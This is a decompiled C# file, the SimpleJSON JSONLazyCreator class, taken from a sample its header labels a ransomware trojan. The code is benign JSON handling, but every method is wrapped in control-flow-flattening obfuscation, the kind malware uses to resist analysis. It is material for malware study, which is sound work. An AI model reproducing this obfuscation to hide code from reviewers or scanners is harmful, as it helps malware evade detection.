// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONLazyCreator
// Assembly: ConcurrentS, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: BBECA65A-DDC9-4285-A0F3-1DAD9BE0ED87
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-29a2cecf014cf5640915defd5f1ca82e75089ad0ec89107be8f9144673d99be6.exe

namespace SimpleJSON
{
  internal class JSONLazyCreator : JSONNode
  {
    private JSONNode m_Node = (JSONNode) null;
    private string m_Key = (string) null;

    public JSONLazyCreator(JSONNode aNode)
    {
      this.m_Node = aNode;
      this.m_Key = (string) null;
    }

    public JSONLazyCreator(JSONNode aNode, string aKey)
    {
label_1:
      int num1 = 1374110205;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 478159163)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 1288476456 ^ -2015388588;
            continue;
          case 3:
            this.m_Node = aNode;
            num1 = (int) num2 * -1033975785 ^ -791923441;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      this.m_Key = aKey;
    }

    private void Set(JSONNode aVal)
    {
label_1:
      int num1 = -2044087193;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1332874563)) % 13U)
        {
          case 0:
            int num3 = !flag ? 1823825181 : (num3 = 1959272192);
            num1 = num3 ^ (int) num2 * 1266296498;
            continue;
          case 1:
            num1 = (int) num2 * -1056943930 ^ -1951671383;
            continue;
          case 2:
            goto label_3;
          case 3:
            flag = this.m_Key == null;
            num1 = (int) num2 * -192445269 ^ -158003454;
            continue;
          case 4:
            goto label_1;
          case 5:
            this.m_Node = (JSONNode) null;
            num1 = -601937747;
            continue;
          case 6:
            num1 = (int) num2 * -833015346 ^ 1301034325;
            continue;
          case 7:
            this.m_Node.Add(this.m_Key, aVal);
            num1 = (int) num2 * 444308318 ^ 390614698;
            continue;
          case 8:
            num1 = -254283380;
            continue;
          case 9:
            num1 = (int) num2 * -503818165 ^ -1884782086;
            continue;
          case 10:
            num1 = (int) num2 * 719241883 ^ 833724986;
            continue;
          case 11:
            num1 = (int) num2 * 624320443 ^ -1731808859;
            continue;
          case 12:
            this.m_Node.Add(aVal);
            num1 = (int) num2 * 1823286064 ^ -1106534226;
            continue;
          default:
            goto label_15;
        }
      }
label_3:
      return;
label_15:;
    }

    public override JSONNode this[int aIndex]
    {
      get
      {
label_1:
        int num1 = 267190955;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1282037695)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this);
              num1 = (int) num2 * -953371491 ^ -1974323782;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return jsonNode;
      }
      set
      {
        JSONArray aVal = new JSONArray();
        aVal.Add(value);
label_1:
        int num1 = 1711634913;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1894519851)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 1122624852 ^ 2106529070;
              continue;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override JSONNode this[string aKey]
    {
      get
      {
label_1:
        int num1 = -1672073266;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1830800177)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this, aKey);
              num1 = (int) num2 * -1993191018 ^ -261644165;
              continue;
            case 2:
              num1 = (int) num2 * 2040854188 ^ -164728816;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return jsonNode;
      }
      set
      {
label_1:
        int num1 = -737072011;
        JSONClass aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1415198923)) % 5U)
          {
            case 0:
              goto label_1;
            case 1:
              aVal = new JSONClass();
              num1 = (int) num2 * 1321253677 ^ 1306225724;
              continue;
            case 2:
              aVal.Add(aKey, value);
              num1 = (int) num2 * -1584828275 ^ 1136331467;
              continue;
            case 3:
              num1 = (int) num2 * 1597437831 ^ 382533230;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        this.Set((JSONNode) aVal);
      }
    }

    public override void Add(JSONNode aItem)
    {
label_1:
      int num1 = 1518684409;
      JSONArray aVal;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1311408387)) % 6U)
        {
          case 0:
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * 1866484989 ^ -2073142286;
            continue;
          case 1:
            num1 = (int) num2 * -203994679 ^ -646969764;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          case 4:
            aVal = new JSONArray();
            num1 = (int) num2 * 404512767 ^ 1415113620;
            continue;
          case 5:
            aVal.Add(aItem);
            num1 = (int) num2 * 923183554 ^ 1188864245;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    public override void Add(string aKey, JSONNode aItem)
    {
label_1:
      int num1 = -1020955321;
      JSONClass aVal;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -468659352)) % 6U)
        {
          case 0:
            aVal.Add(aKey, aItem);
            num1 = (int) num2 * 1311395678 ^ 667766403;
            continue;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * 1247206954 ^ 660100203;
            continue;
          case 3:
            this.Set((JSONNode) aVal);
            num1 = (int) num2 * 865691565 ^ 1226541813;
            continue;
          case 4:
            goto label_1;
          case 5:
            aVal = new JSONClass();
            num1 = (int) num2 * 1053532654 ^ -273180350;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    public static bool operator ==(JSONLazyCreator a, object b)
    {
label_1:
      int num1 = -483407385;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1395552994)) % 6U)
        {
          case 0:
            flag = (object) a == b;
            num1 = -1190597229;
            continue;
          case 2:
            num1 = (int) num2 * 992995497 ^ 271187237;
            continue;
          case 3:
            flag = true;
            num1 = (int) num2 * 1985849716 ^ -1238247660;
            continue;
          case 4:
            goto label_1;
          case 5:
            int num3 = b != null ? -1331781941 : (num3 = -1144288846);
            num1 = num3 ^ (int) num2 * 921439035;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      return flag;
    }

    public static bool operator !=(JSONLazyCreator a, object b)
    {
      bool flag = !(a == b);
label_1:
      int num1 = 1519739742;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 33064574)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * -597254956 ^ 311121667;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return flag;
    }

    public override bool Equals(object obj)
    {
      if (obj != null)
        goto label_4;
label_1:
      int num1 = -559068585;
label_2:
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -582568398)) % 5U)
        {
          case 0:
            num1 = (int) num2 * -681600250 ^ 2093802676;
            continue;
          case 1:
            flag = true;
            num1 = (int) num2 * 640314260 ^ -547010068;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_4;
          default:
            goto label_6;
        }
      }
label_6:
      return flag;
label_4:
      flag = (object) this == obj;
      num1 = -203476248;
      goto label_2;
    }

    public override int GetHashCode()
    {
label_1:
      int num1 = 530438477;
      int hashCode;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1782651480)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            hashCode = base.GetHashCode();
            num1 = (int) num2 * 1233338225 ^ 167185946;
            continue;
          case 3:
            num1 = (int) num2 * -174354053 ^ 1910350023;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return hashCode;
    }

    public override string ToString() => "";

    public override string ToString(string aPrefix)
    {
label_1:
      int num1 = 678467305;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1201583396)) % 4U)
        {
          case 1:
            str = "";
            num1 = (int) num2 * -1767194611 ^ 282392694;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -2073330454 ^ -1106007034;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    public override int AsInt
    {
      get
      {
label_1:
        int num1 = 2053442342;
        JSONData aVal;
        int asInt;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 387266808)) % 4U)
          {
            case 0:
              goto label_1;
            case 2:
              aVal = new JSONData(0);
              num1 = (int) num2 * -1347854084 ^ -1660504677;
              continue;
            case 3:
              this.Set((JSONNode) aVal);
              asInt = 0;
              num1 = (int) num2 * -833088450 ^ -2062681601;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asInt;
      }
      set
      {
        JSONData aVal = new JSONData(value);
label_1:
        int num1 = -431321549;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1357933255)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 285187548 ^ 1433536426;
              continue;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override float AsFloat
    {
      get
      {
        JSONData aVal = new JSONData(0.0f);
label_1:
        int num1 = 811180840;
        float asFloat;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 739707746)) % 4U)
          {
            case 1:
              asFloat = 0.0f;
              num1 = (int) num2 * 123520200 ^ 1890257974;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -531604289 ^ -1960545759;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return asFloat;
      }
      set
      {
        this.Set((JSONNode) new JSONData(value));
label_1:
        int num1 = -1874034252;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1596378790)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              num1 = (int) num2 * 522066527 ^ 797228302;
              continue;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public override double AsDouble
    {
      get
      {
label_1:
        int num1 = 143271408;
        JSONData aVal;
        double asDouble;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1768180370)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              this.Set((JSONNode) aVal);
              asDouble = 0.0;
              num1 = (int) num2 * 45083610 ^ -1395278965;
              continue;
            case 2:
              aVal = new JSONData(0.0);
              num1 = (int) num2 * -1584970102 ^ 308388855;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return asDouble;
      }
      set => this.Set((JSONNode) new JSONData(value));
    }

    public override bool AsBool
    {
      get
      {
label_1:
        int num1 = 396742756;
        JSONData aVal;
        bool asBool;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1278398084)) % 5U)
          {
            case 0:
              goto label_1;
            case 1:
              aVal = new JSONData(false);
              num1 = (int) num2 * 536192985 ^ -104403828;
              continue;
            case 3:
              this.Set((JSONNode) aVal);
              asBool = false;
              num1 = (int) num2 * -1487930935 ^ 1505625924;
              continue;
            case 4:
              num1 = (int) num2 * 2012157400 ^ -1442676494;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        return asBool;
      }
      set
      {
label_1:
        int num1 = -241008262;
        JSONData aVal;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1726955139)) % 4U)
          {
            case 0:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * 449215962 ^ 2045275932;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              aVal = new JSONData(value);
              num1 = (int) num2 * 1215192842 ^ 1162769979;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override JSONArray AsArray
    {
      get
      {
        JSONArray aVal = new JSONArray();
        this.Set((JSONNode) aVal);
label_1:
        int num1 = -1940594110;
        JSONArray asArray;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -461683401)) % 4U)
          {
            case 0:
              num1 = (int) num2 * 666657189 ^ 15140920;
              continue;
            case 1:
              asArray = aVal;
              num1 = (int) num2 * 1536120514 ^ -1303648975;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return asArray;
      }
    }

    public override JSONClass AsObject
    {
      get
      {
        JSONClass aVal = new JSONClass();
label_1:
        int num1 = 407693633;
        JSONClass asObject;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1030573156)) % 5U)
          {
            case 0:
              num1 = (int) num2 * 153697939 ^ 1783072023;
              continue;
            case 2:
              this.Set((JSONNode) aVal);
              num1 = (int) num2 * -1719681337 ^ -615543298;
              continue;
            case 3:
              goto label_1;
            case 4:
              asObject = aVal;
              num1 = (int) num2 * -1814792972 ^ 19746839;
              continue;
            default:
              goto label_6;
          }
        }
label_6:
        return asObject;
      }
    }
  }
}
